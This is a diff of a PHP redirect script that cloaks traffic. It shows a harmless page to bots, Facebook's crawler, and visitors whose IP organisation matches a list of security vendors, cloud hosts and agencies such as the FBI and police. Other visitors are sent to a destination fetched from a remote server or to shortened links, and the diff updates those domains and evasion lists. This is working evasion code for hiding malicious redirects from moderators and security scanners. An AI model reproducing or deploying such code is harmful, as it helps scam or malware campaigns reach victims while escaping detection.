@@ -17,6 +17,7 @@
 		}
 		return $rname;
 	}
+
 	function random($length = 10) {
 		$characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
 		$randomString = '';
@@ -25,6 +26,7 @@
 		}
 		return $randomString;
 	}
+
 	function getORG(){
 		$ch = curl_init();
 		curl_setopt($ch, CURLOPT_URL, 'http://ipinfo.io/'.$_SERVER["REMOTE_ADDR"].'/org');
@@ -34,19 +36,23 @@
 		curl_close($ch);
 		return $org;
 	}
+
 	function getSite(){
 		$ch = curl_init();
-		curl_setopt($ch, CURLOPT_URL, 'http://gcndris.info/php/site.php');
+		curl_setopt($ch, CURLOPT_URL, 'http://newtab.me/php/site.php');
 		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 		$site = curl_exec($ch);
 		curl_close($ch);
 		return $site;
 	}
+
 	$action = 'theme';	
+
 	require_once('Mobile_Detect.php');
 	require_once('Browser.php');
 	$detect = new Mobile_Detect;
 	$browser = new Browser();
+
 	if($browser->isRobot()){
 		$action = 'theme';
 	}else if($detect->isMobile() || $browser->isMobile()){
@@ -56,6 +62,7 @@
 	}else{
 		$action = 'theme';
 	}
+
 	if($action == 'site'){
 		$_SERVER['HTTP_REFERER'] = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
 		$refs = array('facebook.com');
@@ -67,12 +74,13 @@
 			}
 		}
 	}
-  $asnlist = array('Facebook','Google','Cloud','Linode','Kaspersky','Host','Level 3 Communications','Mcafee','Akamai International','NeuStar','Amazon','Microsoft','ocean','LeaseWeb','Radore','AVAST','QSC AG','Radix','ICANN','Dynamic Network Services','ESET','OVH SAS','layer','Dropbox','Maktek','FBI','Netguard','data-center','Data Center','datacent','LEPL','ministarstvo','ministry','hurricane','justic','navy','Black Fox Limited','WholeSale','redstation','Privax','trafficholder','rackspace','defense','Zscaler','Steadfast Networks','Federal','SingleHop','QuadraNet','Screen Saver','security','intel','govern','interpol','bitdefender','admin','cyber','apple','crime','azure','cisco','polic','bing','isprime','court','DOGAN','INETLTD','TELLCOM','AS197328','NETHOUSE','KOCNET','ASTURKNET','ULAKNET','ESOESNET','AS43260','AS198436','AS62054','DORUKNET','Digital Energy Technologies','WEDOS','ITLAS','TRABIA','Transip','incorporated','inc.', 'Ltda.', '-AS', 'meerfarbig', 'PORTLANE', 'Amsterdam, the Netherlands', 'ASGIGAS', 'Tunisia BackBone AS', 'Flycom Comunicaciones', 'Forcepoint', 'WebNX', 'Trend Micro', 'OVH Hosting');
+
+	$asnlist = array('facebook','google','linode','kaspersy','mcafee','amazon','microsoft corporation','digital ocean','incorporated','inc.','radore','netvision','veri merkezi','data center','mcafee','twitter','mail.ru','vkontakte','aruba','ovh sas','online s.a.s','denetron','contabo');
 	
 	if($action != 'theme'){
 		$_SERVER['GEOIP_ORG'] = getORG();
 		foreach ($asnlist as $asn) {
-      if(strpos(strtolower($_SERVER['GEOIP_ORG']), strtolower($asn)) !== false){
+			if(strpos(strtolower($_SERVER['GEOIP_ORG']), $asn) !== false){
 				$action = 'theme';	
 				break;
 			}
@@ -81,18 +89,21 @@
 			$action = 'mobile';	
 		}
 	}
+
 	if(isset($_SERVER['HTTP_X_FB_CURL_CLIENT'])){
 		$action = 'theme';	
 	}
+
 	if(isset($_SERVER['REQUEST_METHOD']) && $_SERVER['REQUEST_METHOD'] != 'GET'){
 		$action = 'theme';	
 	}
 	if(isset($_SERVER['HTTP_X_PURPOSE']) || $_SERVER['HTTP_USER_AGENT'] == ''){
 		$action = 'theme';
 	}
+
 	if($action != 'theme'){
 		$_SERVER['HTTP_REFERER'] = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
-    $bannedrefs = array('facebook.com/lsr.php','l.facebook.com/l.php','digitalocean.com','facebook.com/help','fb.me','blogspot.video');
+		$bannedrefs = array('facebook.com/lsr.php','l.facebook.com/l.php','digitalocean.com','facebook.com/help','fb.me');
 		foreach ($bannedrefs as $ref) {
 			if(strpos($_SERVER['HTTP_REFERER'], $ref) !== false){
 				$action = 'theme';
@@ -107,8 +118,9 @@
 	}
 	$id = isset(explode("/", $id)[1]) ? explode("/", $id)[1] : $id;
 	$id = isset(explode(".", $id)[0]) ? explode(".", $id)[0] : $id;
+
 	if($action == 'mobile'){
-		header('Location: https://goo.gl/vpZfUC?'.rand(11111,99999));
+		header('Location: https://goo.gl/M7guJl?'.rand(11111,99999));
 	}else if($action == 'site'){
 		$app_site = getSite();
 		header("Location: http://$app_site/$id");
@@ -119,7 +131,8 @@
 			header("Content-Type:image/jpeg");
 			echo file_get_contents("https://i.imgur.com/$id.jpg");
 		}else{
-			include("share.php");
+			header("HTTP/1.1 301 Moved Permanently");
+			header("Location: https://$id.com");
 		}
 	}
 ?>
